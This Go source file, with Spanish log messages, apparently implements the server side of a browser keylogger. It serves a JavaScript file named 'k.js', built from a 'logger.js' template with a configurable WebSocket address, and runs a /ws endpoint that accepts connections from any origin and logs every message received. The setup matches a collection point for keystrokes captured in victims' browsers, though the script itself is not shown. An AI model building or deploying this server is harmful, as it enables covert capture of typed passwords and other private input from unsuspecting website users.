package main

import (
	"flag"
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { 
			log.Println("Intento de conexión WebSocket desde:", r.RemoteAddr)
			return true 
		},
	}

	listenAddr string
	wsAddr     string
	jsTemplate *template.Template
)

func init() {
	flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
	flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
	flag.Parse()
	var err error
	jsTemplate, err = template.ParseFiles("logger.js")
	if err != nil {
		panic(err)
	}
}

func serveWS(w http.ResponseWriter, r *http.Request) {
    conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil {
        log.Println("Error al actualizar a WebSocket:", err)
        http.Error(w, "No se pudo establecer WebSocket", http.StatusInternalServerError)
        return
    }
    defer conn.Close()

    log.Printf("WebSocket conectado con %s\n", conn.RemoteAddr())

    for {
        messageType, msg, err := conn.ReadMessage()
        if err != nil {
            log.Println("Conexión WebSocket cerrada:", err)
            break
        }
        log.Printf("Mensaje recibido: %s\n", string(msg))

        // Responder al cliente (opcional)
        err = conn.WriteMessage(messageType, []byte("Mensaje recibido: "+string(msg)))
        if err != nil {
            log.Println("Error al enviar mensaje:", err)
            break
        }
    }
}



func serveFile(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/javascript")
    log.Println("Sirviendo k.js con wsAddr:", wsAddr)

    err := jsTemplate.Execute(w, struct{ WSAddr string }{WSAddr: wsAddr})
    if err != nil {
        log.Println("Error sirviendo k.js:", err)
        http.Error(w, "Error rendering JavaScript", http.StatusInternalServerError)
    }
}


func main() {
	r := mux.NewRouter()
	r.HandleFunc("/ws", serveWS)
	r.HandleFunc("/k.js", serveFile)
	log.Fatal(http.ListenAndServe(":8080", r))
}
